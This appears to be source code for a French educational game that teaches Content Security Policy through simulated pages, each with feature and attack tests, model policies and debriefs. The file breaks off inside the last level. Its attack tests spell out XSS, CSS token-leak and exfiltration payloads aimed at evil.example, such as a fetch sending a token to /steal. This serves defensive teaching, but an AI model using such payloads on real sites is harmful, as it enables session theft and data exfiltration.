import { NONCE, SELF, type Action, type Directive, type Policy } from '../lib/csp';
import { defineSeries, type SeriesProfile } from '../lib/series';

// Modèle du jeu « CSP Builder ».
//
// Une série = une page de Novafact, avec ce qui doit y fonctionner et ce qui
// doit y être bloqué. Le joueur compose la politique jeton par jeton ; le
// simulateur (lib/csp.ts) applique la sémantique réelle de CSP niveau 3. La
// difficulté ne vient pas du nombre de directives : elle vient de la distance
// entre le test qui échoue et le jeton qui le corrige.
//
//   N1 · Chaque test se règle par une directive, et le détail du test la
//        désigne : une origine, un schéma, une balise. Aucune interaction
//        entre jetons. On apprend la forme : le repli sur default-src, et les
//        trois directives qui n'en ont pas (base-uri, form-action,
//        frame-ancestors).
//
//   N2 · Un jeton change le sens d'un autre, ou un réglage « évident » casse
//        une fonctionnalité : un nonce qui fait ignorer 'unsafe-inline', un
//        'self' qui ne désigne pas le bon sous-domaine, un joker qui couvre
//        trop ou pas assez, une origine autorisée qui sert du contenu déposé
//        par un attaquant. Il faut lire le contexte de la page.
//
//   N3 · Plusieurs sauts : 'strict-dynamic' retourne le sens des listes
//        d'hôtes, un chemin exact cesse de compter après une redirection, le
//        défaut est une absence (Trusted Types, base-uri), et la politique la
//        plus « verrouillée » en apparence est le piège. La bonne politique
//        dépend d'un détail : le script est-il inséré par le parseur ou par
//        programme, la page peut-elle porter un nonce ?

export interface CspTest {
  id: string;
  label: string;
  detail: string;
  kind: 'feature' | 'attack';
  action: Action;
}

export interface DirectiveChoice { d: Directive; hint: string; tokens: string[] }

export interface CspPage {
  /** Identifiant stable : il sert à composer les séries. */
  id: string;
  level: 1 | 2 | 3;
  title: string;
  /** L'origine de la page : c'est elle que désigne 'self'. */
  origin: string;
  context: string;
  directiveChoices: DirectiveChoice[];
  initialPolicy: Policy;
  cspTests: CspTest[];
  /** Une politique qui passe tous les tests (vérifiée par script). */
  solution: Policy;
  /** Affiché tant que la politique n'est pas parfaite. */
  hint: string;
  /** Ce qu'il fallait voir, affiché en fin de partie. */
  debrief: string;
  /** Un cas réel documenté, quand il y en a un qui colle. */
  realCase?: string;
}

const EVIL = 'https://evil.example';
const WWW = 'https://www.novafact.example';
const ADMIN = 'https://admin.novafact.example';
const EMBED = 'https://embed.novafact.example';
const AIDE = 'https://aide.novafact.example';

// Empreinte (fictive) du petit script de configuration du centre d'aide.
const HASH = "'sha256-9Y2lE3b0Qm7K1xR4tVwZ8nH5cJ6pL0sA2dF4gU7kM1o='";

// ── N1 · Le site vitrine ────────────────────────────────────────────────────

const vitrine: CspPage = {
  id: 'vitrine',
  level: 1,
  title: 'Le site vitrine',
  origin: WWW,
  context: 'Des pages statiques : un script maison, une feuille de style, des polices et des images servies par le site lui-même, des icônes en data: dans la CSS, et un formulaire d’inscription qui poste vers l’application. Le blog publie des articles invités importés d’un ancien CMS. Aucune CSP aujourd’hui.',
  directiveChoices: [
    { d: 'default-src', hint: 'Repli pour les directives de chargement absentes', tokens: ["'self'", "'none'", '*'] },
    { d: 'img-src', hint: 'Images, y compris celles que la CSS appelle', tokens: ["'self'", 'data:', '*'] },
    { d: 'base-uri', hint: 'Balise <base>', tokens: ["'self'", "'none'"] },
    { d: 'form-action', hint: 'Destinations des formulaires', tokens: ["'self'", 'https://app.novafact.example'] },
    { d: 'frame-ancestors', hint: 'Qui peut intégrer cette page', tokens: ["'none'", "'self'", '*'] },
  ],
  initialPolicy: {},
  cspTests: [
    { id: 'v-js', kind: 'feature', label: 'Script du site', detail: '<script src="/js/site.js">', action: { kind: 'script', url: `${WWW}/js/site.js` } },
    { id: 'v-css', kind: 'feature', label: 'Feuille de style', detail: '/css/site.css', action: { kind: 'style', url: `${WWW}/css/site.css` } },
    { id: 'v-font', kind: 'feature', label: 'Polices', detail: '/fonts/inter.woff2', action: { kind: 'fetch', directive: 'font-src', url: `${WWW}/fonts/inter.woff2` } },
    { id: 'v-img', kind: 'feature', label: 'Visuels', detail: '/img/hero.webp', action: { kind: 'fetch', directive: 'img-src', url: `${WWW}/img/hero.webp` } },
    { id: 'v-icons', kind: 'feature', label: 'Icônes de la CSS', detail: 'background: url("data:image/svg+xml,…")', action: { kind: 'fetch', directive: 'img-src', url: 'data:image/svg+xml,%3Csvg%3E%3C/svg%3E' } },
    { id: 'v-form', kind: 'feature', label: 'Formulaire d’inscription', detail: 'POST vers https://app.novafact.example/signup', action: { kind: 'form', url: 'https://app.novafact.example/signup' } },
    { id: 'v-a-inline', kind: 'attack', label: 'Script inline injecté', detail: 'Un article invité importé sans nettoyage contient un <script>', action: { kind: 'script' } },
    { id: 'v-a-ext', kind: 'attack', label: 'Script externe injecté', detail: '<script src="https://evil.example/x.js"> dans le même article', action: { kind: 'script', url: `${EVIL}/x.js` } },
    { id: 'v-a-img', kind: 'attack', label: 'Pixel de pistage injecté', detail: '<img src="https://evil.example/p.gif?…">', action: { kind: 'fetch', directive: 'img-src', url: `${EVIL}/p.gif` } },
    { id: 'v-a-base', kind: 'attack', label: 'Balise <base> injectée', detail: 'Réécrit tous les liens relatifs de la page vers evil.example', action: { kind: 'base', url: `${EVIL}/` } },
    { id: 'v-a-form', kind: 'attack', label: 'Faux formulaire', detail: 'Un « Réactivez votre compte » qui poste vers evil.example', action: { kind: 'form', url: `${EVIL}/collect` } },
    { id: 'v-a-frame', kind: 'attack', label: 'Clickjacking', detail: 'Le site dans une iframe invisible, chez evil.example', action: { kind: 'framed-by', origin: EVIL } },
  ],
  solution: {
    'default-src': ["'self'"],
    'img-src': ["'self'", 'data:'],
    'base-uri': ["'self'"],
    'form-action': ['https://app.novafact.example'],
    'frame-ancestors': ["'none'"],
  },
  hint: 'Trois directives ne se replient jamais sur default-src. Et \'self\' désigne www.novafact.example, rien d’autre.',
  debrief: 'default-src \'self\' couvre d’un coup scripts, styles, polices et images — mais pas data:, que ni \'self\' ni * ne couvrent : les icônes exigent img-src \'self\' data:. base-uri, form-action et frame-ancestors n’ont pas de repli : sans elles, une <base>, un faux formulaire et l’intégration par un tiers passent, quelle que soit la valeur de default-src. Enfin, \'self\' est l’origine exacte de la page ; l’application est une autre origine, qu’il faut nommer.',
  realCase: 'Twitter, février 2009 : le ver « Don’t Click » plaçait le bouton de publication de Twitter, dans une iframe invisible, sous un bouton leurre ; chaque clic publiait le lien et propageait l’attaque. frame-ancestors est la réponse normalisée à ce clickjacking.',
};

// ── N1 · Le tableau de bord ─────────────────────────────────────────────────

const tableauDeBord: CspPage = {
  id: 'tableau-de-bord',
  level: 1,
  title: 'Le tableau de bord',
  origin: SELF,
  context: 'Une application React compilée par Vite : un bundle et une feuille de style servis par l’application, une API sur api.novafact.example (requêtes et flux d’événements), des avatars stockés sur files.novafact.example, et l’aperçu local du logo avant envoi. Les notes de facture sont rendues en HTML par dangerouslySetInnerHTML.',
  directiveChoices: [
    { d: 'default-src', hint: 'Repli pour les directives de chargement absentes', tokens: ["'self'", "'none'", '*'] },
    { d: 'script-src', hint: 'Scripts, gestionnaires inline et eval', tokens: ["'self'", "'unsafe-inline'", "'unsafe-eval'", 'https:'] },
    { d: 'img-src', hint: 'Images', tokens: ["'self'", 'https://files.novafact.example', 'blob:', 'data:', '*'] },
    { d: 'connect-src', hint: 'fetch, XHR, EventSource, WebSocket', tokens: ["'self'", 'https://api.novafact.example', '*'] },
    { d: 'frame-ancestors', hint: 'Qui peut intégrer cette page', tokens: ["'none'", "'self'"] },
  ],
  initialPolicy: {
    'default-src': ['*'],
    'script-src': ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
    'img-src': ['*', 'blob:'],
  },
  cspTests: [
    { id: 'd-bundle', kind: 'feature', label: 'Bundle de l’application', detail: '<script type="module" src="/assets/index-3f9a.js">', action: { kind: 'script', url: `${SELF}/assets/index-3f9a.js` } },
    { id: 'd-css', kind: 'feature', label: 'Feuille de style', detail: '/assets/index-3f9a.css', action: { kind: 'style', url: `${SELF}/assets/index-3f9a.css` } },
    { id: 'd-api', kind: 'feature', label: 'Appels à l’API', detail: 'fetch vers https://api.novafact.example/v1/invoices', action: { kind: 'fetch', directive: 'connect-src', url: 'https://api.novafact.example/v1/invoices' } },
    { id: 'd-events', kind: 'feature', label: 'Notifications en direct', detail: 'EventSource sur https://api.novafact.example/v1/events', action: { kind: 'fetch', directive: 'connect-src', url: 'https://api.novafact.example/v1/events' } },
    { id: 'd-avatars', kind: 'feature', label: 'Avatars', detail: 'https://files.novafact.example/avatars/…', action: { kind: 'fetch', directive: 'img-src', url: 'https://files.novafact.example/avatars/42.webp' } },
    { id: 'd-preview', kind: 'feature', label: 'Aperçu du logo avant envoi', detail: '<img src="blob:https://app.novafact.example/…">, via URL.createObjectURL', action: { kind: 'fetch', directive: 'img-src', url: `blob:${SELF}/6f1c2a90-8d3e-4b1a-9c55-0e7b2d4f8a11` } },
    { id: 'd-img', kind: 'feature', label: 'Illustrations', detail: '/img/empty-state.svg', action: { kind: 'fetch', directive: 'img-src', url: `${SELF}/img/empty-state.svg` } },
    { id: 'd-a-handler', kind: 'attack', label: 'Gestionnaire injecté', detail: 'Une note de facture contient <img src=x onerror="…">', action: { kind: 'handler' } },
    { id: 'd-a-srcdoc', kind: 'attack', label: 'Script dans une iframe srcdoc', detail: 'Une note contient <iframe srcdoc="<script src=https://evil.example/x.js>"> : l’iframe hérite de la politique', action: { kind: 'script', url: `${EVIL}/x.js` } },
    { id: 'd-a-eval', kind: 'attack', label: 'Chaîne évaluée', detail: 'Un script de débogage oublié passe ?expr= à new Function()', action: { kind: 'eval' } },
    { id: 'd-a-fetch', kind: 'attack', label: 'Exfiltration par fetch', detail: 'fetch("https://evil.example/steal", { body: jeton })', action: { kind: 'fetch', directive: 'connect-src', url: `${EVIL}/steal` } },
    { id: 'd-a-img', kind: 'attack', label: 'Exfiltration par image', detail: '<img src="https://evil.example/?d=…">', action: { kind: 'fetch', directive: 'img-src', url: `${EVIL}/p.gif` } },
    { id: 'd-a-frame', kind: 'attack', label: 'Clickjacking', detail: 'Le tableau de bord intégré par evil.example', action: { kind: 'framed-by', origin: EVIL } },
  ],
  solution: {
    'default-src': ["'self'"],
    'img-src': ["'self'", 'https://files.novafact.example', 'blob:'],
    'connect-src': ['https://api.novafact.example'],
    'frame-ancestors': ["'none'"],
  },
  hint: '* ne couvre ni blob: ni data:. Et une directive explicite remplace default-src pour son type de ressource, elle ne s’y ajoute pas.',
  debrief: 'Un bundle servi par l’application n’a besoin que de \'self\' : sans \'unsafe-inline\', les gestionnaires injectés tombent (ils relèvent de script-src-attr, qui se replie sur script-src puis default-src), et sans \'unsafe-eval\', new Function() lève une erreur. api.novafact.example est une autre origine que l’application : connect-src doit la nommer. Les URL blob: ne sont couvertes ni par \'self\' ni par * : l’aperçu local exige blob: dans img-src — à réserver à img-src, jamais à script-src.',
};

// ── N2 · Le back-office du support ──────────────────────────────────────────

const backOffice: CspPage = {
  id: 'back-office',
  level: 2,
  title: 'Le back-office du support',
  origin: ADMIN,
  context: 'Rendu côté serveur : chaque réponse porte un nonce, que le gabarit pose sur ses <script> et ses <style>. Le widget de chat d’un prestataire a été collé tel quel, sans nonce : son chargeur ajoute ses scripts, sa feuille de style, une iframe de dépôt de fichiers, et positionne ses éléments par des attributs style. Les tickets des clients — texte libre, pièces jointes servies par /attachments/ — s’affichent dans la page.',
  directiveChoices: [
    { d: 'default-src', hint: 'Repli pour les directives de chargement absentes', tokens: ["'self'", "'none'"] },
    { d: 'script-src', hint: 'Scripts et gestionnaires inline', tokens: ["'self'", NONCE, "'unsafe-inline'", 'https://widget.support.example', 'https:'] },
    { d: 'style-src', hint: 'Styles : repli de -elem et -attr', tokens: ["'self'", NONCE, "'unsafe-inline'", 'https://widget.support.example'] },
    { d: 'style-src-elem', hint: '<style> et <link rel="stylesheet">', tokens: ["'self'", NONCE, "'unsafe-inline'", 'https://widget.support.example'] },
    { d: 'style-src-attr', hint: 'Attributs style="…"', tokens: ["'unsafe-inline'", "'none'"] },
    { d: 'img-src', hint: 'Images, y compris celles appelées par la CSS', tokens: ["'self'", 'https://widget.support.example', '*'] },
    { d: 'connect-src', hint: 'fetch, XHR, EventSource', tokens: ["'self'", 'https://chat.support.example', '*'] },
    { d: 'frame-src', hint: 'Iframes que la page intègre', tokens: ['https://widget.support.example', '*'] },
    { d: 'frame-ancestors', hint: 'Qui peut intégrer cette page', tokens: ["'none'", "'self'"] },
  ],
  initialPolicy: {
    'default-src': ["'self'"],
    'script-src': ["'self'", "'unsafe-inline'", 'https:'],
    'style-src': ["'self'", "'unsafe-inline'", 'https://widget.support.example'],
    'img-src': ['*'],
    'connect-src': ['*'],
    'frame-src': ['*'],
  },
  cspTests: [
    { id: 'b-bundle', kind: 'feature', label: 'Script du back-office', detail: '<script nonce src="/static/admin.js">', action: { kind: 'script', url: `${ADMIN}/static/admin.js`, nonce: true } },
    { id: 'b-config', kind: 'feature', label: 'Configuration inline', detail: '<script nonce>window.ADMIN = {…}</script>', action: { kind: 'script', nonce: true } },
    { id: 'b-loader', kind: 'feature', label: 'Chargeur du widget', detail: '<script src="https://widget.support.example/loader.js">, sans nonce', action: { kind: 'script', url: 'https://widget.support.example/loader.js' } },
    { id: 'b-widget-js', kind: 'feature', label: 'Scripts du widget', detail: 'Insérés par le chargeur depuis https://widget.support.example/app.js', action: { kind: 'script', url: 'https://widget.support.example/app.js', dynamic: true } },
    { id: 'b-app-style', kind: 'feature', label: 'Styles critiques du gabarit', detail: '<style nonce>…</style>', action: { kind: 'style', nonce: true } },
    { id: 'b-app-css', kind: 'feature', label: 'Feuille de style du back-office', detail: '/static/admin.css', action: { kind: 'style', url: `${ADMIN}/static/admin.css` } },
    { id: 'b-widget-css', kind: 'feature', label: 'Feuille de style du widget', detail: '<link rel="stylesheet" href="https://widget.support.example/widget.css">', action: { kind: 'style', url: 'https://widget.support.example/widget.css' } },
    { id: 'b-widget-attr', kind: 'feature', label: 'Placement du widget', detail: '<div style="bottom: 24px; right: 24px">', action: { kind: 'style-attr' } },
    { id: 'b-chat', kind: 'feature', label: 'Messages du chat', detail: 'fetch vers https://chat.support.example/v2/messages', action: { kind: 'fetch', directive: 'connect-src', url: 'https://chat.support.example/v2/messages' } },
    { id: 'b-upload', kind: 'feature', label: 'Dépôt de fichiers du widget', detail: '<iframe src="https://widget.support.example/upload">', action: { kind: 'fetch', directive: 'frame-src', url: 'https://widget.support.example/upload' } },
    { id: 'b-avatars', kind: 'feature', label: 'Photos des agents', detail: 'https://widget.support.example/avatars/…', action: { kind: 'fetch', directive: 'img-src', url: 'https://widget.support.example/avatars/7.png' } },
    { id: 'b-a-inline', kind: 'attack', label: 'Script inline dans un ticket', detail: '<script> collé dans le corps d’un ticket', action: { kind: 'script' } },
    { id: 'b-a-handler', kind: 'attack', label: 'Gestionnaire injecté', detail: '<img src=x onerror="…"> dans un ticket', action: { kind: 'handler' } },
    { id: 'b-a-attach', kind: 'attack', label: 'Pièce jointe exécutée', detail: 'Un ticket injecte <script src="/attachments/8812/facture.js">', action: { kind: 'script', url: `${ADMIN}/attachments/8812/facture.js` } },
    { id: 'b-a-ext', kind: 'attack', label: 'Script externe injecté', detail: '<script src="https://evil.example/x.js">', action: { kind: 'script', url: `${EVIL}/x.js` } },
    { id: 'b-a-style', kind: 'attack', label: 'Feuille de style injectée', detail: 'Un <style> qui lit le jeton CSRF par sélecteurs d’attribut', action: { kind: 'style' } },
    { id: 'b-a-leak', kind: 'attack', label: 'Fuite par la CSS', detail: 'background: url(https://evil.example/?t=a…), appelé par ce <style>', action: { kind: 'fetch', directive: 'img-src', url: `${EVIL}/?t=a` } },
    { id: 'b-a-fetch', kind: 'attack', label: 'Exfiltration par fetch', detail: 'fetch vers evil.example', action: { kind: 'fetch', directive: 'connect-src', url: `${EVIL}/steal` } },
    { id: 'b-a-frame', kind: 'attack', label: 'Clickjacking', detail: 'Le back-office intégré par evil.example', action: { kind: 'framed-by', origin: EVIL } },
  ],
  solution: {
    'default-src': ["'self'"],
    'script-src': [NONCE, 'https://widget.support.example'],
    'style-src-elem': ["'self'", NONCE, 'https://widget.support.example'],
    'style-src-attr': ["'unsafe-inline'"],
    'img-src': ["'self'", 'https://widget.support.example'],
    'connect-src': ["'self'", 'https://chat.support.example'],
    'frame-src': ['https://widget.support.example'],
    'frame-ancestors': ["'none'"],
  },
  hint: 'Un nonce dans une liste fait ignorer \'unsafe-inline\', et un attribut style ne peut pas porter de nonce. Le script du back-office a un nonce : a-t-il encore besoin de \'self\' ?',
  debrief: 'Deux leurres. D’abord \'self\' dans script-src : le bundle passe déjà par son nonce, et \'self\' n’ajoute qu’une chose, l’exécution des pièces jointes servies par la même origine. Ensuite les styles : \'unsafe-inline\' sans nonce laisse passer le <style> injecté qui lit le jeton CSRF ; avec un nonce, il est ignoré et les attributs style du widget cassent. La sortie est de séparer : style-src-elem avec le nonce pour les éléments, style-src-attr \'unsafe-inline\' pour les attributs — un attribut ne peut ni lire la page par sélecteurs ni viser d’autres éléments. Le widget, lui, reste autorisé par son hôte : il n’a pas de nonce, et ses scripts insérés doivent correspondre à la liste puisqu’il n’y a pas de \'strict-dynamic\'. Les pièces jointes, enfin, méritent une origine à part.',
};

// ── N2 · Le module intégré chez les clients ─────────────────────────────────

const integration: CspPage = {
  id: 'integration',
  level: 2,
  title: 'Le module intégré',
  origin: EMBED,
  context: 'embed.novafact.example sert le module « Payer cette facture », que des clients intègrent en iframe dans leur portail : portail.client-a.example, et les sous-domaines de client-b.example, qui signale que le module reste blanc chez lui. L’application Novafact affiche le même module en aperçu. Le module poste le paiement vers le prestataire. Le contrat de l’ancien client Orion a pris fin l’an dernier ; son domaine a expiré, puis a été racheté.',
  directiveChoices: [
    { d: 'default-src', hint: 'Repli pour les directives de chargement absentes', tokens: ["'self'", "'none'"] },
    { d: 'base-uri', hint: 'Balise <base>', tokens: ["'none'", "'self'"] },
    { d: 'form-action', hint: 'Destinations des formulaires', tokens: ["'self'", 'https://pay.psp.example', '*'] },
    {
      d: 'frame-ancestors',
      hint: 'Qui peut intégrer cette page',
      tokens: ["'self'", "'none'", '*', 'https:', 'https://portail.client-a.example', 'https://client-b.example', 'https://*.client-b.example', 'https://app.novafact.example', 'https://orion-factures.example'],
    },
  ],
  initialPolicy: {
    'default-src': ["'self'"],
    'frame-ancestors': ["'self'", 'https://portail.client-a.example', 'https://client-b.example', 'https://orion-factures.example'],
  },
  cspTests: [
    { id: 'e-js', kind: 'feature', label: 'Script du module', detail: '/embed.js', action: { kind: 'script', url: `${EMBED}/embed.js` } },
    { id: 'e-api', kind: 'feature', label: 'API du module', detail: 'fetch vers /api/invoice', action: { kind: 'fetch', directive: 'connect-src', url: `${EMBED}/api/invoice` } },
    { id: 'e-client-a', kind: 'feature', label: 'Portail du client A', detail: 'Intégré par https://portail.client-a.example', action: { kind: 'framed-by', origin: 'https://portail.client-a.example' } },
    { id: 'e-client-b1', kind: 'feature', label: 'Factures du client B', detail: 'Intégré par https://factures.client-b.example', action: { kind: 'framed-by', origin: 'https://factures.client-b.example' } },
    { id: 'e-client-b2', kind: 'feature', label: 'Filiale européenne du client B', detail: 'Intégré par https://eu.client-b.example', action: { kind: 'framed-by', origin: 'https://eu.client-b.example' } },
    { id: 'e-preview', kind: 'feature', label: 'Aperçu dans Novafact', detail: 'Intégré par https://app.novafact.example', action: { kind: 'framed-by', origin: 'https://app.novafact.example' } },
    { id: 'e-pay', kind: 'feature', label: 'Paiement', detail: 'POST vers https://pay.psp.example/checkout', action: { kind: 'form', url: 'https://pay.psp.example/checkout' } },
    { id: 'e-a-evil', kind: 'attack', label: 'Clickjacking', detail: 'Intégré par evil.example, le bouton « Payer » caché sous un leurre', action: { kind: 'framed-by', origin: EVIL } },
    { id: 'e-a-orion', kind: 'attack', label: 'Domaine expiré racheté', detail: 'Intégré par https://orion-factures.example', action: { kind: 'framed-by', origin: 'https://orion-factures.example' } },
    { id: 'e-a-form', kind: 'attack', label: 'Formulaire détourné', detail: 'action vers https://evil.example/pay', action: { kind: 'form', url: `${EVIL}/pay` } },
    { id: 'e-a-base', kind: 'attack', label: 'Balise <base> injectée', detail: 'Réécrit les liens relatifs du module vers evil.example', action: { kind: 'base', url: `${EVIL}/` } },
    { id: 'e-a-script', kind: 'attack', label: 'Script externe injecté', detail: '<script src="https://evil.example/x.js">', action: { kind: 'script', url: `${EVIL}/x.js` } },
  ],
  solution: {
    'default-src': ["'self'"],
    'base-uri': ["'none'"],
    'form-action': ['https://pay.psp.example'],
    'frame-ancestors': ['https://portail.client-a.example', 'https://*.client-b.example', 'https://app.novafact.example'],
  },
  hint: '\'self\' est l’origine du module, pas celle de l’application. Un joker *.client-b.example couvre les sous-domaines, pas le domaine nu — et l’inverse est vrai aussi.',
  debrief: 'frame-ancestors est une liste de clients, pas une case à cocher : * ou https: rouvrent le clickjacking, \'none\' casse le produit. Trois pièges de lecture. \'self\' désigne embed.novafact.example ; l’aperçu vient de app.novafact.example, une autre origine. https://client-b.example ne couvre aucun sous-domaine, et *.client-b.example ne couvrirait pas le domaine nu. Enfin la liste vieillit : un domaine d’ancien client qui expire peut être racheté par n’importe qui, et il hérite du droit d’intégrer le module — l’allowlist se tient à jour avec le fichier des contrats. frame-ancestors n’a pas de repli sur default-src, et elle est ignorée dans une balise <meta> : elle doit partir en en-tête.',
  realCase: 'Twitter, février 2009 : le ver « Don’t Click » cachait le bouton de publication de Twitter dans une iframe invisible, sous un bouton leurre. Le correctif de l’époque — un script qui sortait la page du cadre — a été contourné en quelques heures ; frame-ancestors déplace la décision dans le navigateur.',
};

// ── N3 · La page de paiement ────────────────────────────────────────────────

const paiement: CspPage = {
  id: 'paiement',
  level: 3,
  title: 'La page de paiement',
  origin: SELF,
  context: 'Elle charge le bundle de l’application (avec nonce), le chargeur d’un gestionnaire de balises et les balises qu’il injecte, l’iframe du prestataire de paiement, une mesure d’audience et les appels à l’API. Les utilisateurs peuvent téléverser des fichiers, servis par /uploads/. Compose une politique qui garde tout ça fonctionnel et bloque les attaques.',
  directiveChoices: [
    { d: 'default-src', hint: 'Repli pour les directives de chargement absentes', tokens: ["'self'", "'none'", '*'] },
    { d: 'script-src', hint: 'Qui peut exécuter du JavaScript', tokens: ["'self'", NONCE, "'strict-dynamic'", "'unsafe-inline'", "'unsafe-eval'", 'https://tags.tm.example', 'https://cdn.tm.example', 'https://cdn.public.example', 'https:'] },
    { d: 'style-src', hint: 'Feuilles de style', tokens: ["'self'", "'unsafe-inline'"] },
    { d: 'img-src', hint: 'Images', tokens: ["'self'", 'data:', '*'] },
    { d: 'connect-src', hint: 'fetch, XHR, WebSocket', tokens: ["'self'", 'https://collect.analytics.example', '*'] },
    { d: 'frame-src', hint: 'Iframes que la page peut intégrer', tokens: ['https://pay.psp.example', '*'] },
    { d: 'object-src', hint: 'Plugins (object, embed)', tokens: ["'none'"] },
    { d: 'base-uri', hint: 'Balise <base>', tokens: ["'none'", "'self'"] },
    { d: 'form-action', hint: 'Destinations des formulaires', tokens: ["'self'"] },
    { d: 'frame-ancestors', hint: 'Qui peut intégrer cette page', tokens: ["'none'", "'self'"] },
  ],
  initialPolicy: {
    'default-src': ['*'],
    'script-src': ["'self'", "'unsafe-inline'", 'https:'],
  },
  cspTests: [
    { id: 'f1', kind: 'feature', label: 'Bundle de l’application', detail: '<script nonce src="/assets/app.js">', action: { kind: 'script', url: `${SELF}/assets/app.js`, nonce: true } },
    { id: 'f2', kind: 'feature', label: 'Chargeur du gestionnaire de balises', detail: '<script nonce src="https://tags.tm.example/loader.js">', action: { kind: 'script', url: 'https://tags.tm.example/loader.js', nonce: true } },
    { id: 'f3', kind: 'feature', label: 'Balises chargées par le gestionnaire', detail: 'Scripts insérés dynamiquement depuis https://cdn.tm.example', action: { kind: 'script', url: 'https://cdn.tm.example/tag.js', dynamic: true } },
    { id: 'f4', kind: 'feature', label: 'Iframe du prestataire de paiement', detail: 'https://pay.psp.example/checkout', action: { kind: 'fetch', directive: 'frame-src', url: 'https://pay.psp.example/checkout' } },
    { id: 'f5', kind: 'feature', label: 'Mesure d’audience', detail: 'fetch vers https://collect.analytics.example', action: { kind: 'fetch', directive: 'connect-src', url: 'https://collect.analytics.example/e' } },
    { id: 'f6', kind: 'feature', label: 'Appels à l’API Novafact', detail: 'fetch vers la même origine', action: { kind: 'fetch', directive: 'connect-src', url: `${SELF}/api/invoices` } },
    { id: 'f7', kind: 'feature', label: 'Images de l’application', detail: '/img/logo.svg', action: { kind: 'fetch', directive: 'img-src', url: `${SELF}/img/logo.svg` } },
    { id: 'f8', kind: 'feature', label: 'Feuilles de style', detail: '/assets/app.css', action: { kind: 'style', url: `${SELF}/assets/app.css` } },
    { id: 'f9', kind: 'feature', label: 'Formulaire de connexion', detail: 'POST vers Novafact', action: { kind: 'form', url: `${SELF}/login` } },
    { id: 'a1', kind: 'attack', label: 'Script inline injecté', detail: 'XSS stockée sans nonce', action: { kind: 'script' } },
    { id: 'a2', kind: 'attack', label: 'Script externe injecté', detail: '<script src="https://evil.example/x.js">', action: { kind: 'script', url: `${EVIL}/x.js` } },
    { id: 'a3', kind: 'attack', label: 'Gadget sur un CDN public', detail: 'Bibliothèque exploitable servie par https://cdn.public.example', action: { kind: 'script', url: 'https://cdn.public.example/old-framework.js' } },
    { id: 'a12', kind: 'attack', label: 'JSONP sur un domaine autorisé', detail: '<script src="https://tags.tm.example/jsonp?callback=…"> injecté', action: { kind: 'script', url: 'https://tags.tm.example/jsonp' } },
    { id: 'a13', kind: 'attack', label: 'Fichier déposé sur l’origine', detail: 'Un .js téléversé par un utilisateur, servi depuis /uploads/', action: { kind: 'script', url: `${SELF}/uploads/avatar.js` } },
    { id: 'a4', kind: 'attack', label: 'Code passé à eval()', detail: 'setTimeout avec une chaîne', action: { kind: 'eval' } },
    { id: 'a5', kind: 'attack', label: 'Balise <base> injectée', detail: 'Détourne /assets/app.js — qui porte le nonce — vers evil.example', action: { kind: 'base', url: `${EVIL}/` } },
    { id: 'a6', kind: 'attack', label: 'Formulaire détourné', detail: 'action vers evil.example', action: { kind: 'form', url: `${EVIL}/collect` } },
    { id: 'a7', kind: 'attack', label: 'Plugin injecté', detail: '<object data="https://evil.example/x">', action: { kind: 'fetch', directive: 'object-src', url: `${EVIL}/x` } },
    { id: 'a8', kind: 'attack', label: 'Exfiltration par fetch', detail: 'fetch vers evil.example', action: { kind: 'fetch', directive: 'connect-src', url: `${EVIL}/steal` } },
    { id: 'a9', kind: 'attack', label: 'Exfiltration par image', detail: '<img src="https://evil.example/?d=…">', action: { kind: 'fetch', directive: 'img-src', url: `${EVIL}/p.gif` } },
    { id: 'a10', kind: 'attack', label: 'Clickjacking', detail: 'Page intégrée par evil.example', action: { kind: 'framed-by', origin: EVIL } },
  ],
  solution: {
    'default-src': ["'self'"],
    'script-src': [NONCE, "'strict-dynamic'"],
    'connect-src': ["'self'", 'https://collect.analytics.example'],
    'frame-src': ['https://pay.psp.example'],
    'object-src': ["'none'"],
    'base-uri': ["'none'"],
    'form-action': ["'self'"],
    'frame-ancestors': ["'none'"],
  },
  hint: 'Une liste de domaines autorise tout ce que ces domaines servent, y compris ce qu’un attaquant peut y déposer ou y appeler. Les balises du gestionnaire sont insérées par programme : que faudrait-il pour qu’elles héritent de la confiance du chargeur ?',
  debrief: 'Nonce et \'strict-dynamic\', sans liste de domaines. Le nonce fait passer le bundle et le chargeur ; \'strict-dynamic\' étend la confiance aux scripts que ce chargeur insère, et fait ignorer hôtes, schémas et \'self\' — ce qui ferme d’un coup le JSONP du gestionnaire de balises, le CDN public et le fichier téléversé. Une politique à nonce a besoin de base-uri : une <base> injectée avant le bundle réécrit son URL relative, et le script de l’attaquant arrive avec un nonce valide. Ajouter https: et \'unsafe-inline\' à côté du nonce est la recette de compatibilité recommandée pour les vieux navigateurs : un navigateur récent les ignore tous les deux.',
  realCase: 'Google, « CSP Is Dead, Long Live CSP! » (Weichselbaum, Spagnuolo, Lekies, Janc, ACM CCS 2016) : sur 26 011 politiques distinctes, 94,72 % étaient contournables, et 14 des 15 domaines les plus autorisés pour les scripts servaient des points de terminaison exploitables (JSONP, bibliothèques). L’article a proposé \'strict-dynamic\'. En 2023, Gareth Heyes (PortSwigger) a montré le même défaut chez Piwik PRO : le domaine d’un gestionnaire de balises, autorisé en entier par la CSP, servait aussi du code AngularJS, et une injection de directives Angular suffisait à la contourner.',
};

// ── N3 · Le centre d'aide ───────────────────────────────────────────────────

const ANGULAR = 'https://cdn.public.example/libs/angular.js/1.6.0/angular.min.js';

const centreAide: CspPage = {
  id: 'centre-aide',
  level: 3,
  title: 'Le centre d’aide',
  origin: AIDE,
  context: 'Un site statique sur S3, derrière CloudFront. L’en-tête CSP vient d’une politique d’en-têtes de réponse CloudFront : identique pour toutes les pages, il ne peut pas porter de nonce. La page charge /static/aide.js, la bibliothèque de recherche Fuse.js depuis un CDN public, et un script inline de configuration dont l’empreinte est connue. Les commentaires des lecteurs sont intégrés aux pages à la génération, sans échappement. /sortie?url= redirige vers n’importe quelle adresse, pour compter les liens sortants.',
  directiveChoices: [
    { d: 'default-src', hint: 'Repli pour les directives de chargement absentes', tokens: ["'self'", "'none'"] },
    {
      d: 'script-src',
      hint: 'Qui peut exécuter du JavaScript',
      tokens: ["'self'", 'https://aide.novafact.example/static/', 'https://cdn.public.example', 'https://cdn.public.example/libs/fuse.js/7.0.0/fuse.min.js', 'https://*.novafact.example', HASH, "'strict-dynamic'", "'unsafe-inline'"],
    },
    { d: 'connect-src', hint: 'fetch, XHR', tokens: ["'self'", 'https://api.novafact.example', 'https://*.novafact.example'] },
  ],
  initialPolicy: {
    'default-src': ["'self'"],
    'script-src': ["'self'", 'https://cdn.public.example', "'unsafe-inline'"],
    'connect-src': ["'self'", 'https://*.novafact.example'],
  },
  cspTests: [
